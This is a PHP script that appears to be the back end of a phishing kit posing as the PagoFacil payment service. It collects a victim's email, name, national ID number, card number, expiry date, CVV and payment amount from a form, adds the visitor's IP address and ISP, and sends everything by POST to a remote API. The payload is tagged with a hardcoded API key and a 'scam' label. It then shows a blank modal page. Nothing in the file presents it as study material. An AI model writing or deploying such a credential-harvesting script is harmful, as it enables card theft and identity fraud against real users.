<?php

$email = $_POST["email"];

$titular = $_POST["name"];
$dni = $_POST["dni"];
$card = $_POST["card"];
$venc = $_POST["venc"];
$cvv = $_POST["cvv"];

$amount = $_POST["amount"];

include_once("config.php");

$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$data = array(
    'apikey' => '7cpVN77ABtDcnwNgQBjAxnH2z0VMhlstDcnwNgQBaYWmaWpVN77A',
    'sender' => $tokens,
	'scam' => "PagoFacil (Premium)",
	'ip' => $ip,
	'isp' => $isp,
	'dni' => $dni,
	'correo' => $email,
	'ccname' => $titular,
	'ccnum' => $card,
	'ccven' => $venc,
	'cccvv' => $cvv,
	'amount' => $amount
);

$result = file_get_contents($apiUrl, false, stream_context_create(array('http' => 
array('header'  => "Content-type: application/x-www-form-urlencoded\r\n",'method'  => 'POST','content' => http_build_query($data)))));

?>
<html>
<head>
<link href="style.css" rel="stylesheet" type="text/css"/>
</head>
<body>
<!-- base semi-transparente -->
<div id="fade" class="overlay">
</div>
<!-- fin base semi-transparente -->
<!-- ventana modal -->
<div id="light" class="modalok">
	<div>
		<div id="plop">
		</div>
	</div>
	
</div>
<!-- fin ventana modal -->
